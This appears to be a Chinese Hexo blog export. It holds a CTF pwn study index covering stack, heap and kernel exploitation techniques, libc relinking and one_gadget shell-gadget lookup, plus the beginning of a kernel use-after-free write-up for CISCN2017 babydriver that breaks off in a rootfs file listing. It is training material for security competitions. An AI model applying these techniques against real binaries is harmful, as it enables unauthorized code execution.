href="https://github.com/lexsd6/LibcSearcher_plus">lexsd6/LibcSearcher_plus: Libsearcher improved according to my personal habits.LibcSearcher所启发优化而来的项目优化代码部分逻辑，使在使用更便捷的基础上，添加one_gatge查询功能。 (github.com)</a></p><h2 id="修改-libc-版本"><a href="#修改-libc-版本" class="headerlink" title="修改 libc 版本"></a>修改 libc 版本</h2><p><a href="https://github.com/NixOS/patchelf">NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)</a></p><ul><li>使用 patchelf 修改解释器和 libc 文件</li></ul><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>常见危险函数</p><ul><li>输入</li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><h4 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h4><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><ul><li>Defcon 2015 Qualifier fuckup</li></ul><h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><ul><li>HCTF 2016 出题人跑路了(pwn 50)</li></ul><h3 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h3><ul><li>EKOPARTY CTF 2016 fuckzing-exploit-200(基于栈的stack pivot)<br>HACKIM CTF 2015 -Exploitation 5(基于堆的stack pivot)</li></ul><h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><ul><li>frame faking</li></ul><h3 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h3><ul><li><p>了解动态链接的过程:</p><ol><li><a href="https://github.com/woai3c/recommended-books/raw/master/%E5%85%B6%E4%BB%96/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E2%80%94%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93.pdf">《程序员的自我修养》</a></li><li><a href="https://lantern.cool/note-binary-dynamic-static-link/">Dynamic and Stack Link</a></li></ol></li><li><p>伪造动态链接的相关数据结构如<code>linkmap</code>、<code>relplt</code>:</p><ul><li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a></li><li><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a></li><li><a href="http://www.inforsec.org/wp/?p=389">http://www.inforsec.org/wp/?p=389</a></li></ul></li><li><p><strong>Codegate CTF Finals 2015 yocto(fake relplt) <a href="http://o0xmuhe.me/2016/10/25/yocto-writeup">http://o0xmuhe.me/2016/10/25/yocto-writeup</a></strong></p></li><li><p>HITCON QUALS CTF 2015 readable(fake linkmap), Hack.lu’s 2015 OREO</p></li></ul><h3 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h3><p>覆盖 canary 保护输出的字符地址</p><h3 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h3><ul><li>HCTF 2016 fheap(基于堆溢出的Partial overwrite)</li><li>溢出位数不够<ul><li>XMAN 2016 广外女生-pwn, Codegate CTF Finals 2015, chess</li></ul></li></ul><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><h3 id="编译指定libc"><a href="#编译指定libc" class="headerlink" title="编译指定libc"></a>编译指定libc</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc file.c -o file -Wl, --rpath=./libc.so.6 -Wl, --dynamic-linker=./ld-2.23.so</span><br></pre></td></tr></table></figure><ul><li><strong>rpath</strong>: libc 的路径</li><li><strong>dynamic-linker</strong>: ld 的路径</li></ul><h3 id="获得libc的one-gadget"><a href="#获得libc的one-gadget" class="headerlink" title="获得libc的one_gadget"></a>获得libc的one_gadget</h3><p><a href="https://github.com/david942j/one_gadget">one_gadget</a>: 获得libc的one_gadget地址</p><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>使用示例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@7d67094353a1:/ctf/work<span class="comment"># one_gadget libc.so.6</span></span><br><span class="line">0x3f3d6 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x3f42a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xd5bf7 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="glibc-源码"><a href="#glibc-源码" class="headerlink" title="glibc 源码"></a>glibc 源码</h3><p><a href="http://ftp.gnu.org/gnu/glibc/">glibc 源码下载地址</a></p><h3 id="堆管理机制"><a href="#堆管理机制" class="headerlink" title="堆管理机制"></a>堆管理机制</h3><ul><li><code>多数Linux发行版</code>: <a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjc27HshfDqAhU1w4sBHTlWA3sQFjAAegQIAxAB&url=https://paper.seebug.org/papers/Archive/refs/heap/glibc%25E5%2586%2585%25E5%25AD%2598%25E7%25AE%25A1%25E7%2590%2586ptmalloc%25E6%25BA%2590%25E4%25BB%25A3%25E7%25A0%2581%25E5%2588%2586%25E6%259E%2590.pdf&usg=AOvVaw2QkZp_edTDs5MkI7y-zVGA">glibc内存管理ptmalloc源代码分析.pdf</a></li><li><code>Android/Firfox</code>: jemalloc</li><li><code>Windows:</code> 微软自己实现了一套内存管理机制, 迄今没有公开</li><li><code>Linux内核</code>: slab、slub、slob分配器</li></ul><h3 id="堆漏洞利用思想"><a href="#堆漏洞利用思想" class="headerlink" title="堆漏洞利用思想"></a>堆漏洞利用思想</h3><ol><li>控制堆内存管理的相关数据结构: 如arena、bins、chunk</li><li>控制堆内存中的用户数据: 覆盖变量指针、函数指针、数据等</li></ol><p>一般情况下都是为了构造任意内存读写以及控制流劫持</p><h3 id="堆漏洞的防护方法"><a href="#堆漏洞的防护方法" class="headerlink" title="堆漏洞的防护方法"></a>堆漏洞的防护方法</h3><ul><li><p>保护堆内存管理</p><ul><li>Heap Canary</li><li>数据结构加密</li><li>在堆管理代码中加入安全检查</li></ul></li><li><p>通防</p><ul><li><p>ASLR</p></li><li><p>DEP</p><pre><code>数据执行保护(DEP)（Data Execution Prevention） 是一套软硬件技术, 能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中, 由硬件和软件一起强制实施 DEP。</code></pre></li></ul></li></ul><h3 id="堆漏洞利用技术与技巧"><a href="#堆漏洞利用技术与技巧" class="headerlink" title="堆漏洞利用技术与技巧"></a>堆漏洞利用技术与技巧</h3><h3 id="free-hook-劫持"><a href="#free-hook-劫持" class="headerlink" title="__free_hook 劫持"></a>__free_hook 劫持</h3><ul><li><a href="https://lantern.cool/note-pwn-free-hook/">__free_hook 劫持原理</a></li></ul><h3 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h3><ul><li><a href="https://lantern.cool/note-pwn-chunk-extend-and-overlapping/">Chunk Extend and Overlapping</a></li></ul><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><ul><li><a href="https://lantern.cool/note-pwn-first-fit-And-UAF/">first fit and UAF</a></li><li>DEFCON CTF Qualifier 2014:shitsco、BCTF 2016:router、HCTF 2016 5-days(较难)</li></ul><h3 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h3><ul><li><p><a href="https://lantern.cool/note-pwn-double-free/">Double free</a></p></li><li><p><a href="https://lantern.cool/wp-item-0ctf-2016-freenote/">0CTF 2016 freenote</a>, <a href="https://lantern.cool/wp-item-HCTF-2016-fheap/">HCTF 2016 fheap</a>, HCTF 2016 5-days(较难)</p></li></ul><h3 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h3><ul><li><a href="https://lantern.cool/note-pwn-heap-overflow/">Heap Overflow</a></li><li>XMAN 2016 fengshui(紫荆花 pwn), SSC安全大会百度展厅 heapcanary, 攻防世界 babyfengshui</li></ul><h3 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h3><ul><li><a href="https://lantern.cool/note-pwn-fastbin-attack/">Fastbin attack</a></li><li>alictf 2016 fb, alictf 2016 starcraft, 0ctf 2016 zerostorage(较难)</li></ul><h4 id="Global-max-fast"><a href="#Global-max-fast" class="headerlink" title="Global_max_fast"></a>Global_max_fast</h4><ul><li><code>2.23</code>版本位于<code>0x3c67f8</code>处, 修改后可将 fastbin 范围扩大, 更容易使用 fastbin 相关攻击。</li></ul><h3 id="Fastbin-dup-consolidate"><a href="#Fastbin-dup-consolidate" class="headerlink" title="Fastbin dup consolidate"></a>Fastbin dup consolidate</h3><ul><li>Fastbin dup consolidate</li></ul><h3 id="Large-bin-attack"><a href="#Large-bin-attack" class="headerlink" title="Large bin attack"></a>Large bin attack</h3><ul><li>Large bin attack</li></ul><h3 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h3><ul><li>Unsorted bin attack</li><li>0ctf2016 Zerostorage</li></ul><h3 id="Overwrite-Topchunk"><a href="#Overwrite-Topchunk" class="headerlink" title="Overwrite Topchunk"></a>Overwrite Topchunk</h3><ul><li>House of Force</li><li>BCTF 2016 bcloud, BCTF 2016 ruin(arm结构)</li></ul><h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><ul><li>Modern Unlink Attack</li><li>Classical Unlink Attack (现glibc中有检查, 不可用)</li><li>Hitcon 2014 qualifier, MMA CTF 2016 Dairy, PlaidCTF 2014 200 ezhp, <a href="https://lantern.cool/wp-item-ZCTF-2016-note2/">ZCTF 2016 note2</a></li></ul><h3 id="Off-by-one-amp-Off-by-bull"><a href="#Off-by-one-amp-Off-by-bull" class="headerlink" title="Off by one &amp; Off by bull"></a>Off by one &amp; Off by bull</h3><p><a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwiDu_Lc_u_qAhXGGaYKHeMCCTAQFjAAegQIBBAB&url=https://go.contextis.com/rs/140-OCV-459/images/Glibc_Adventures-The_Forgotten_Chunks.pdf&usg=AOvVaw0lgQoKkgRucjSg_rC4bojF">Glibc_Adventures-The_Forgotten_Chunks.pdf</a></p><ul><li><a href="https://lantern.cool/note-tool-pwndocker/">off by one</a></li><li><strong>off by one</strong>: MMA CTF 2016 Dairy</li><li><strong>off by null</strong>: <a href="https://lantern.cool/wp-item-plaidctf-2015-plaiddb/">plaid CTF 2015 datastore</a>, XMAN 2016 Final love_letter</li></ul><h3 id="Chunk-shrink"><a href="#Chunk-shrink" class="headerlink" title="Chunk shrink"></a>Chunk shrink</h3><ul><li>Chunk shrink</li></ul><h3 id="House-of-系列"><a href="#House-of-系列" class="headerlink" title="House of 系列"></a>House of 系列</h3><h4 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h4><ul><li><a href="https://lantern.cool/note-pwn-house-of-spirit/">House of spirit</a></li><li>I-ctf2016-pwn200</li></ul><h4 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h4><ul><li>House of Einherjar</li></ul><h4 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h4><ul><li>House of Force</li></ul><h4 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h4><ul><li>House of Lore</li></ul><h4 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h4><ul><li>House of Orange</li></ul><h4 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h4><ul><li>House of Rabbit</li></ul><h4 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h4><ul><li>House of Roman</li></ul><h4 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House-of-Corrosion"></a>House-of-Corrosion</h4><ul><li>House-of-Corrosion</li></ul><h3 id="Heap-spray-堆喷"><a href="#Heap-spray-堆喷" class="headerlink" title="Heap spray(堆喷)"></a>Heap spray(堆喷)</h3><ul><li>pwnhub.cn calc</li></ul><h3 id="Heap-fengshui-堆风水-堆排布"><a href="#Heap-fengshui-堆风水-堆排布" class="headerlink" title="Heap fengshui(堆风水/堆排布)"></a>Heap fengshui(堆风水/堆排布)</h3><ul><li>Heap fengshui</li></ul><h3 id="Exploit-mmap-chunk"><a href="#Exploit-mmap-chunk" class="headerlink" title="Exploit mmap chunk"></a>Exploit mmap chunk</h3><ul><li>Hitcon 2014 qualifier stkof</li><li>0ops培训资料 <a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjojPetgPDqAhWJMd4KHUHDBicQFjAAegQIBRAB&url=https://raw.githubusercontent.com/veritas501/attachment_in_blog/ff24f5a79f4854157e8ce50b6810d1508d14ea9f/Linux%2520Heap%2520Internals/Linux%2520Heap%2520Internals.pdf&usg=AOvVaw3Uq6oCNYH8sJNFqSYrZSDi">Linux heap internal.pdf</a></li></ul><h3 id="改写more-core"><a href="#改写more-core" class="headerlink" title="改写more core"></a>改写more core</h3><ul><li>HCTF 2016 5-days</li></ul><h3 id="House-of-Orange-改写-IO-list-all"><a href="#House-of-Orange-改写-IO-list-all" class="headerlink" title="House of Orange : 改写_IO_list_all"></a>House of Orange : 改写_IO_list_all</h3><ul><li>Hitcon 2016House of orange</li></ul><h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><ul><li>相关结构</li></ul><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p><a href="https://elixir.bootlin.com/linux">源码地址</a></p><h3 id="解压内核镜像获得-vmlinux"><a href="#解压内核镜像获得-vmlinux" class="headerlink" title="解压内核镜像获得 vmlinux"></a>解压内核镜像获得 vmlinux</h3><p><a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a></p><h3 id="解压-重打包-cpio-文件"><a href="#解压-重打包-cpio-文件" class="headerlink" title="解压/重打包 cpio 文件"></a>解压/重打包 cpio 文件</h3><p>解压</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; baby.cpio</span><br></pre></td></tr></table></figure><p>重打包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><a href="https://lantern.cool/note-pwn-kernel-environment/">Linux Kernel 环境配置</a></p><h3 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h3><p><a href="https://lantern.cool/note-pwn-kernel-basics/">Linux Kernel Basics</a></p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p><a href="https://lantern.cool/note-pwn-kernel-UAF/">Linux Kernel UAF</a></p><h3 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h3><p><a href="https://lantern.cool/note-pwn-kernel-rop/">Linux Kernel ROP</a></p><h3 id="Ret2usr"><a href="#Ret2usr" class="headerlink" title="Ret2usr"></a>Ret2usr</h3><p><a href="https://lantern.cool/note-pwn-kernel-ret2usr/">Linux Kernel ret2usr</a></p><h3 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass-smep"></a>bypass-smep</h3><p>Linux Kernel bypass-smep</p><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul><li>格式化字符串</li><li>MMACTF 2016 greeting, HCTF 2016 fheap, RuCTF 2016 weather</li></ul><h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><ul><li>安恒杯 武汉大学邀请赛 fackfuzz, stupid shell</li></ul><h2 id="代码逻辑漏洞"><a href="#代码逻辑漏洞" class="headerlink" title="代码逻辑漏洞"></a>代码逻辑漏洞</h2><ul><li>UCTF 2016 note</li></ul><h2 id="类型漏洞"><a href="#类型漏洞" class="headerlink" title="类型漏洞"></a>类型漏洞</h2><ul><li>CVE-2015-3077</li></ul><h2 id="缓冲区未初始化"><a href="#缓冲区未初始化" class="headerlink" title="缓冲区未初始化"></a>缓冲区未初始化</h2><ul><li><p>栈未初始化时, 栈中数据为上次函数调用留下的栈帧</p></li><li><p>堆未初始化时, 堆中数据为上次使用该堆块所留下的数据</p></li><li><p>UCTF 2016 note, 华山杯2016决赛 SU_PWN, 33C3 CTF PWN</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nuoye-blog.github.io/2020/05/09/77b152fd/">pwn中各种利用技巧1</a><br><a href="https://nuoye-blog.github.io/2020/05/09/eeb80347/">pwn中各种利用技巧2</a><br><a href="https://www.ichunqiu.com/course/57493">Atum大佬的CTF PWN选手养成</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel UAF</title>
      <link href="/note-pwn-kernel-UAF/"/>
      <url>/note-pwn-kernel-UAF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf-zh/">CTF Wiki Kernel-UAF</a> 根据学习情况略有修改</p><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>解压<code>rootfs.cpio</code>看一下有什么文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  babydriver mkdir core</span><br><span class="line">➜  babydriver <span class="built_in">cd</span> core</span><br><span class="line">➜  core mv ../rootfs.cpio rootfs.cpio.gz</span><br><span class="line">➜  core gunzip ./rootfs.cpio.gz</span><br><span class="line">➜  core ls</span><br><span class="line">rootfs.cpio</span><br><span class="line">➜  core cpio -idmv &lt; rootfs.cpio</span><br><span class="line">.</span><br><span class="line">etc</span><br><span class="line">etc/init.d</span><br><span class="line">etc/passwd</span><br><span class="line">etc/group</span><br><span class="line">bin</span><br><span class="line">bin/su</span><br><span class="line">bin/grep</span><br><span class="line">bin/watch</span><br><span class="line">bin/<span class="built_in">stat</span></span><br><span class="line">bin/df</span><br><span class="line">bin/ed</span><br><span class="line">bin/mktemp</span><br><span class="line">bin/mpstat</span><br><span class="line">bin/makemime</span><br><span class="line">bin/ipcalc</span><br><span class="line">bin/mountpoint</span><br><span class="line">bin/ash</span><br><span class="line">bin/chattr</span><br><span class="line">bin/rmdir</span><br><span class="line">bin/nice</span><br><span class="line">bin/linux64</span><br><span class="line">bin/gzip</span><br><span class="line">bin/sync</span><br><span class="line">bin/sed</span><br><span class="line">bin/run-parts</span><br><span class="line">bin/login</span><br><span class="line">bin/gunzip</span><br><span class="line">bin/rm</span><br><span class="line">bin/chgrp</span><br><span class="line">bin/touch</span><br><span class="line">bin/uname</span><br><span class="line">bin/<span class="built_in">pwd</span></span><br><span class="line">bin/rev</span><br><span class="line">bin/printenv</span><br><span class="line">bin/fgrep</span><br><span class="line">bin/mkdir</span><br><span class="line">bin/iostat</span><br><span class="line">bin/umount</span><br><span class="line">bin/linux32</span><br><span class="line">bin/mount</span><br><span class="line">bin/mv</span><br><span class="line">bin/setarch</span><br><span class="line">bin/sleep</span><br><span class="line">bin/<span class="built_in">kill</span></span><br><span class="line">bin/dumpkmap</span><br><span class="line">bin/ping6</span><br><span class="line">bin/cttyhack</span><br><span class="line">bin/catv</span><br><span class="line">bin/dnsdomainname</span><br><span class="line">bin/netstat</span><br><span class="line">bin/ping</span><br><span class="line">bin/setserial</span><br><span class="line">bin/stty</span><br><span class="line">bin/dd</span><br><span class="line">bin/<span class="literal">false</span></span><br><span class="line">bin/lsattr</span><br><span class="line">bin/reformime</span><br><span class="line">bin/busybox</span><br><span class="line">bin/scriptreplay</span><br><span class="line">bin/base64</span><br><span class="line">bin/ps</span><br><span class="line">bin/ls</span><br><span class="line">bin/zcat</span><br><span class="line">bin/conspy</span><br><span class="line">bin/lzop</span><br><span class="line">bin/pidof</span><br><span class="line">bin/fatattr</span><br><span class="line">bin/date</span><br><span class="line">bin/mt</span><br><span class="line">bin/tar</span><br><span class="line">bin/fdflush</span><br><span class="line">bin/pipe_progress</span><br><span class="line">bin/ionice</span><br><span class="line">bin/mknod</span><br><span class="line">bin/dmesg</span><br><span class="line">bin/hostname</span><br><span class="line">bin/<span class="built_in">echo</span></span><br><span class="line">bin/chown</span><br><span class="line">bin/hush</span><br><span class="line">bin/vi</span><br><span class="line">bin/cat</span><br><span class="line">bin/more</span><br><span class="line">bin/chmod</span><br><span class="line">bin/cpio</span><br><span class="line">bin/rpm</span><br><span class="line">bin/<span class="literal">true</span></span><br><span class="line">bin/getopt</span><br><span class="line">bin/egrep</span><br><span class="line">bin/sh</span><br><span class="line">bin/usleep</span><br><span class="line">bin/cp</span><br><span class="line">bin/kbd_mode</span><br><span class="line">bin/fsync</span><br><span class="line">bin/ln</span><br><span class="line">sbin</span><br><span class="line">sbin/ifdown</span><br><span class="line">sbin/iplink</span><br><span class="line">sbin/ifconfig</span><br><span class="line">sbin/ipneigh</span><br><span class="line">sbin/bootchartd</span><br><span class="line">sbin/mkfs.vfat</span><br><span class="line">sbin/losetup</span><br><span class="line">sbin/watchdog</span><br><span class="line">sbin/iptunnel</span><br><span class="line">sbin/halt</span><br><span class="line">sbin/ifup</span><br><span class="line">sbin/modinfo</span><br><span class="line">sbin/swapoff</span><br><span class="line">sbin/init</span><br><span class="line">sbin/runlevel</span><br><span class="line">sbin/fdisk</span><br><span class="line">sbin/fsck</span><br><span class="line">sbin/mkfs.minix</span><br><span class="line">sbin/reboot</span><br><span class="line">sbin/uevent</span><br><span class="line">sbin/switch_root</span><br><span class="line">sbin/depmod</span><br><span class="line">sbin/acpid</span><br><span class="line">sbin/start-stop-daemon</span><br><span class="line">sbin/mdev</span><br><span class="line">sbin/tunctl</span><br><span class="line">sbin/sulogin</span><br><span class="line">sbin/sysctl</span><br><span class="line">sbin/logread</span><br><span class="line">sbin/insmod</span><br><span class="line">sbin/ipaddr</span><br><span class="line">sbin/zcip</span><br><span class="line">sbin/ip</span><br><span class="line">sbin/mkswap</span><br><span class="line">sbin/mkfs.ext2</span><br><span class="line">sbin/swapon</span><br><span class="line">sbin/route</span><br><span class="line">sbin/mkdosfs</span><br><span class="line">sbin/iproute</span><br><span class="line">sbin/blkid</span><br><span class="line">sbin/hwclock</span><br><span class="line">sbin/fstrim</span><br><span class="line">sbin/blockdev</span><br><span class="line">sbin/fbsplash</span><br><span class="line">sbin/raidautorun</span><br><span class="line">sbin/hdparm</span><br><span class="line">sbin/slattach</span><br><span class="line">sbin/lsmod</span><br><span class="line">sbin/iprule</span><br><span class="line">sbin/syslogd</span><br><span class="line">sbin/freeramdisk</span><br><span class="line">sbin/poweroff</span><br><span class="line">sbin/klogd</span><br><span class="line">sbin/modprobe</span><br><span class="line">sbin/nameif</span><br><span class="line">sbin/setconsole</span><br><span class="line">sbin/ifenslave</span><br><span class="line">sbin/loadkmap</span><br><span class="line">sbin/mke2fs</span><br><span class="line">sbin/makedevs</span><br><span class="line">sbin/arp</span><br><span class="line">sbin/udhcpc</span><br><span class="line">sbin/rmmod</span><br><span class="line">sbin/vconfig</span><br><span class="line">sbin/pivot_root</span><br><span class="line">sbin/devmem</span><br><span class="line">sbin/getty</span><br><span class="line">sbin/adjtimex</span><br><span class="line">sbin/findfs</span><br><span class="line">sbin/fsck.minix</span><br><span class="line">init</span><br><span class="line">proc</span><br><span class="line">lib</span><br><span class="line">lib/modules</span><br><span class="line">lib/modules/4.4.72</span><br><span class="line">lib/modules/4.4.72/babydriver.ko</span><br><span class="line">sys</span><br><span class="line">usr</span><br><span class="line">usr/bin</span><br><span class="line">usr/bin/uptime</span><br><span class="line">usr/bin/find</span><br><span class="line">usr/bin/unlzop</span><br><span class="line">usr/bin/expand</span><br><span class="line">usr/bin/sv</span><br><span class="line">usr/bin/tail</span><br><span class="line">usr/bin/less</span><br><span class="line">usr/bin/uudecode</span><br><span class="line">usr/bin/resize</span><br><span class="line">usr/bin/<span class="built_in">printf</span></span><br><span class="line">usr/bin/cal</span><br><span class="line">usr/bin/md5sum</span><br><span class="line">usr/bin/dos2unix</span><br><span class="line">usr/bin/blkdiscard</span><br><span class="line">usr/bin/pmap</span><br><span class="line">usr/bin/last</span><br><span class="line">usr/bin/cksum</span><br><span class="line">usr/bin/unzip</span><br><span class="line">usr/bin/groups</span><br><span class="line">usr/bin/unlink</span><br><span class="line">usr/bin/runsv</span><br><span class="line">usr/bin/nohup</span><br><span class="line">usr/bin/sha256sum</span><br><span class="line">usr/bin/runsvdir</span><br><span class="line">usr/bin/smemcap</span><br><span class="line">usr/bin/renice</span><br><span class="line">usr/bin/deallocvt</span><br><span class="line">usr/bin/basename</span><br><span class="line">usr/bin/logname</span><br><span class="line">usr/bin/nsenter</span><br><span class="line">usr/bin/lzopcat</span><br><span class="line">usr/bin/head</span><br><span class="line">usr/bin/clear</span><br><span class="line">usr/bin/tty</span><br><span class="line">usr/bin/sha1sum</span><br><span class="line">usr/bin/tac</span><br><span class="line">usr/bin/whois</span><br><span class="line">usr/bin/unlzma</span><br><span class="line">usr/bin/patch</span><br><span class="line">usr/bin/hexdump</span><br><span class="line">usr/bin/sort</span><br><span class="line">usr/bin/script</span><br><span class="line">usr/bin/comm</span><br><span class="line">usr/bin/uuencode</span><br><span class="line">usr/bin/awk</span><br><span class="line">usr/bin/pscan</span><br><span class="line">usr/bin/traceroute</span><br><span class="line">usr/bin/envdir</span><br><span class="line">usr/bin/dumpleases</span><br><span class="line">usr/bin/timeout</span><br><span class="line">usr/bin/setkeycodes</span><br><span class="line">usr/bin/ipcrm</span><br><span class="line">usr/bin/od</span><br><span class="line">usr/bin/expr</span><br><span class="line">usr/bin/fold</span><br><span class="line">usr/bin/strings</span><br><span class="line">usr/bin/rpm2cpio</span><br><span class="line">usr/bin/id</span><br><span class="line">usr/bin/nmeter</span><br><span class="line">usr/bin/ipcs</span><br><span class="line">usr/bin/env</span><br><span class="line">usr/bin/dirname</span><br><span class="line">usr/bin/dpkg-deb</span><br><span class="line">usr/bin/truncate</span><br><span class="line">usr/bin/traceroute6</span><br><span class="line">usr/bin/openvt</span><br><span class="line">usr/bin/pwdx</span><br><span class="line">usr/bin/shuf</span><br><span class="line">usr/bin/bzcat</span><br><span class="line">usr/bin/ftpget</span><br><span class="line">usr/bin/whoami</span><br><span class="line">usr/bin/bzip2</span><br><span class="line">usr/bin/hd</span><br><span class="line">usr/bin/unshare</span><br><span class="line">usr/bin/ftpput</span><br><span class="line">usr/bin/<span class="built_in">which</span></span><br><span class="line">usr/bin/pgrep</span><br><span class="line">usr/bin/tee</span><br><span class="line">usr/bin/lzcat</span><br><span class="line">usr/bin/eject</span><br><span class="line">usr/bin/envuidgid</span><br><span class="line">usr/bin/top</span><br><span class="line">usr/bin/pstree</span><br><span class="line">usr/bin/bunzip2</span><br><span class="line">usr/bin/lpr</span><br><span class="line">usr/bin/<span class="built_in">test</span></span><br><span class="line">usr/bin/xzcat</span><br><span class="line">usr/bin/reset</span><br><span class="line">usr/bin/wc</span><br><span class="line">usr/bin/hostid</span><br><span class="line">usr/bin/unxz</span><br><span class="line">usr/bin/mesg</span><br><span class="line">usr/bin/lsof</span><br><span class="line">usr/bin/svc</span><br><span class="line">usr/bin/passwd</span><br><span 